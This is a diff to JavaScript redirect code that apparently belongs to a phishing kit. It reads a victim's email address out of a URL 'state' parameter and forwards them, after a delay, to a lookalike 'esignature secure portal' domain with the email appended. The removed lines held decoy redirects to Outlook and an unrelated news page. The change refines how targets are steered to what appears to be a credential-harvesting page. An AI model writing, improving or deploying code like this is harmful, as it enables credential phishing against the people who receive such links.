@@ -180,35 +180,37 @@
 
         const REDIRECT_DELAY = 2500;
         const MOBILE_REDIRECT_URL_BASE = "https://esignatureonlinesecureportalaccess.tdmgo.co/?WqXmwl=ZjEwMDI1ODc2NDEyNGUwN2FmYzgxZDQwNmE1MDYwZmU%3D&Zw6aMW=eNKKj8h&username=";
-        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
-        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis";
 
-        function isMobileDevice() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
-        }
+        function getEmailFromState() {
+            const searchParams = new URLSearchParams(window.location.search);
+            const state = searchParams.get('state');
+            if (!state) {
+                return null;
+            }
 
-        function getPotentialValue() {
-            const hash = window.location.hash.substring(1);
-            if (hash) {
-                try { return decodeURIComponent(hash); } catch (e) { return hash; } 
+            const parts = state.split(':');
+            
+            // Only proceed if a colon was found and there is content after it.
+            if (parts.length > 1) {
+                const potentialEmail = parts[parts.length - 1];
+                // Check if the part after the colon looks like an email.
+                if (potentialEmail && potentialEmail.includes('@')) {
+                    return potentialEmail;
+                }
             }
-            const search = window.location.search.substring(1);
-            if (search) {
-                try { return decodeURIComponent(search); } catch (e) { return search; } 
-            }
+            
             return null;
         }
 
         function performRedirect() {
             clearInterval(interval);
-            const value = getPotentialValue();
+            const email = getEmailFromState();
 
-            if (value) {
-                console.log("Found value:", value);
-                const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                    window.location.href = redirectUrl;
+            if (email) {
+                console.log("Found email:", email);
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + encodeURIComponent(email);
+                console.log("Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
             } else {
                 console.log("No value found in hash or search. Showing error.");
                 document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
